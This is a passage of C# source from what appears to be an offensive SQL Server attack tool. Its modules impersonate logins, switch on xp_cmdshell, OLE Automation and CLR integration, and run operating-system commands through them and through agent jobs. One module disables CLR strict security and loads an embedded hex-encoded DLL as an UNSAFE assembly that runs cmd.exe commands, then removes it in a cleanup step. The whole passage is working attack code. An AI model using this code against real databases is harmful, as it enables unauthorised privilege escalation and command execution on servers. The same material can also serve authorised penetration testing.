                //Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "use msdb; EXECUTE AS USER = 'guest';  SELECT SYSTEM_USER ; "));
                // Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "use msdb; EXECUTE AS USER = 'guest';  SELECT USER_NAME(); "));


                Console.Out.WriteLine("\n[+]  ~ after imp- dbo in msdb imp:");
                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "use msdb; EXECUTE AS USER = 'dbo';  SELECT SYSTEM_USER ; "));
                Console.Out.WriteLine("\n[+] ~login mapd as user: " + sqlQuery.ExecuteQuery(con, "use msdb; EXECUTE AS USER = 'dbo';  SELECT USER_NAME(); "));


                Console.Out.WriteLine("\n[+] Roles: ");
                Roles RolesX = new Roles();
                //RolesX.Impersonate(con, "public", impersonate);
                //RolesX.Impersonate(con, "sysadmin", impersonate);
                RolesX.YImpersonate(con, "public");
                RolesX.YImpersonate(con, "sysadmin");

            }

            // iquery
            else if (module.Equals("iquery"))
            {
                Console.Out.WriteLine("\n[+] Executing " + option + " as " + impersonate + " on " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; " + option));
            }
            // ienablexp
            else if (module.Equals("ienablexp"))
            {
                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "1", impersonate);
            }
            // idisablexp
            else if (module.Equals("idisablexp"))
            {
                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "0", impersonate);
            }
            // ixpcmd
            else if (module.Equals("ixpcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                XPCmdShell XPCmdShell = new XPCmdShell();
                XPCmdShell.ImpersonateCommand(con, option, impersonate);
            }
            // ienableole
            else if (module.Equals("ienableole"))
            {
                Console.Out.WriteLine("\n[+] Enabling Ole Automation Procedures as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "1", impersonate);
            }
            // idisableole
            else if (module.Equals("idisableole"))
            {
                Console.Out.WriteLine("\n[+] Disabling Ole Automation Procedures as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "0", impersonate);
            }
            // iolecmd
            else if (module.Equals("iolecmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                OLE Ole = new OLE();
                Ole.ImpersonateCommand(con, option, impersonate);
            }
            // ienableclr
            else if (module.Equals("ienableclr"))
            {
                Console.Out.WriteLine("\n[+] Enabling CLR Integration as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "1", impersonate);
            }
            // idisableclr
            else if (module.Equals("idisableclr"))
            {
                Console.Out.WriteLine("\n[+] Disabling CLR Integration as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "0", impersonate);
            }
            // iclr
            else if (module.Equals("iclr"))
            {
                Console.Out.WriteLine("\n[+] Performing CLR custom assembly attack as " + impersonate + " on " + sqlServer);
                CLR clr = new CLR();
                clr.Impersonate(con, option, function, impersonate);
            }
            // iagentstatus
            else if (module.Equals("iagentstatus"))
            {
                AgentJobs aj = new AgentJobs();
                aj.AgentStatus(con, sqlServer, impersonate);
            }
            // iagentcmd
            else if (module.Equals("iagentcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                AgentJobs aj = new AgentJobs();
                aj.ImpersonateAgentCommand(con, sqlServer, option, impersonate);
            }
            
            
            // load
            else if (module.Equals("xclrload"))
            { 

                Console.Out.WriteLine("\n[+] CLR custom assembly attack as " + impersonate + " on " + sqlServer);

                Console.Out.WriteLine("\n[+] impersonate userr " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));


                Console.Out.WriteLine("\n[+] enable optionss " + sqlQuery.ExecuteQuery(con, "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;   "));


                Console.Out.WriteLine("\n[+] create assemm my_assembly " + sqlQuery.ExecuteQuery(con, "CREATE ASSEMBLY my_assembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500006486020093DC70B20000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000730A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F403000023537472696E67730000000018070000580000002355530070070000100000002347554944000000800700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E0113030600FB0113030600AC00E1020F00330300000600D40077020600710177020600520177020600E20177020600AE0177020600C70177020600010177020600C000F40206009E00F40206003501770206001C012D020600850370020A00EB00C0020A00470242030E006803E1020A006200C0020E009702E10206005D0270020A002000C0020A008E0014000A00D703C0020A008600C0020600A8020A000600B5020A000000000001000000000001000100010010005703000041000100010048200000000096003500620001000921000000008618DB02060002000000010056000900DB0201001100DB0206001900DB020A002900DB0210003100DB0210003900DB0210004100DB0210004900DB0210005100DB0210005900DB0210006100DB0215006900DB0210007100DB0210007900DB0210008900DB0206009900DB020600990089022100A90070001000B1007E032600A90070031000A90019021500A900BC0315009900A3032C00B900DB023000A100DB023800C9007D003F00D100980344009900A9034A00E1003D004F00810051024F00A1005A025300D100E2034400D1004700060099008C0306009900980006008100DB02060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007002000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700636D64457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000CA057959B4FE5F4D86851392351B07D600042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C010007636D6445786563000005010000000017010012436F7079726967687420C2A920203230323200002901002437373336623532612D353938632D343034322D386538662D64363434643864303965356400000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000006FAFECB90000000002000000570000001C2A00001C0C00000000000000000000000000001000000000000000000000000000000052534453E857F1B36927AD42BE88208A067847EA01000000433A5C55736572735C646576325C736F757263655C7265706F735C636D64457865635C6F626A5C7836345C52656C656173655C636D64457865632E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E000000000063006D00640045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006D00640045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D00640045007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D0065000000000063006D00640045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;"));

                Console.Out.WriteLine("\n[+] create procedure cmdExec " + sqlQuery.ExecuteQuery(con, "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];"));


                Console.Out.WriteLine("\n[+] demo whoami command   " + sqlQuery.ExecuteQuery(con, "EXEC cmdExec 'whoami';"));


            }
            //xclr exec command
            else if (module.Equals("xclrx"))
            {

                Console.Out.WriteLine("\n[+] CLR custom assembly attack as " + impersonate + " on " + sqlServer);

                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);


                Console.Out.WriteLine("\n[+] impersonate userr " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));

                Console.Out.WriteLine("\n[+] switch db~ msdb " + sqlQuery.ExecuteQuery(con, "use msdb;"));



                Console.Out.WriteLine("\n[+] Command   " + sqlQuery.ExecuteQuery(con, "EXEC cmdExec  '" + option + "';"));



            }

            //xclrClean
            else if (module.Equals("xclrclean"))
            {

                Console.Out.WriteLine("\n[+] CLR custom assembly cleanup~~ " + impersonate + " on " + sqlServer);

                Console.Out.WriteLine("\n[+] impersonate userr " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));

                Console.Out.WriteLine("\n[+] switch db~ msdb " + sqlQuery.ExecuteQuery(con, "use msdb;"));

                Console.Out.WriteLine("\n[+] dropprocedure cmdExec " + sqlQuery.ExecuteQuery(con, "DROP PROCEDURE cmdExec;"));

                Console.Out.WriteLine("\n[+] drop assembly my_assembly " + sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY my_assembly;"));

                


            }

            else
            {
                Console.WriteLine("\n[!] ERROR: Module " + module + " does not exist\n");
            }
        } // end EvaluateTheArguments
    }
}
